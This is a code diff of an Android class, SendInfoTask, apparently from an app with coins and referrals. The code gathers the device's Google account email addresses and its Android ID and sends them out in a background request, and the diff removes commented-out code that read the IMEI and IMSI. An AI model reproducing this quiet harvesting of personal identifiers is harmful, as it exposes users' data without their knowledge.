@@ -32,22 +32,15 @@ public class SendInfoTask extends AsyncTask<Void, Void, Void> {
 
     @Override
     protected Void doInBackground(Void... voids) {
-        Log.i("SendInfoTask", "Send info");
 
-//        String serviceName = Context.TELEPHONY_SERVICE;
-//        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(serviceName);
-//        String IMEI,IMSI;
-//        IMEI = telephonyManager.getDeviceId();
-//        IMSI = telephonyManager.getSubscriberId();
-
-        String refferal = context.getSharedPreferences("referral", Context.MODE_PRIVATE).getString("referral", "");
+        String referrer = context.getSharedPreferences("referrer", Context.MODE_PRIVATE).getString("referrer", "");
 
         try {
             String urlParameters =
                     "id=" + Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID)
                     + "&info=" + collectInfo()
                     + "&coins=" + CoinsSingleton.getInstance().getValue()
-                    + "&refferal=" + refferal;
+                    + "&referrer=" + referrer;
 
 
             Log.i("SendInfoTask", "Send info" + urlParameters);
@@ -84,11 +77,12 @@ public class SendInfoTask extends AsyncTask<Void, Void, Void> {
     private String collectInfo() {
         StringBuilder info = new StringBuilder();
 
-        Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
         Account[] accounts = AccountManager.get(context).getAccounts();
         info.append("email=");
         for (Account account : accounts) {
-            info.append(account.name).append(",");
+            if(account.type.equals("com.google")) {
+                info.append(account.name).append(",");
+            }
         }
         info.append(";");
 
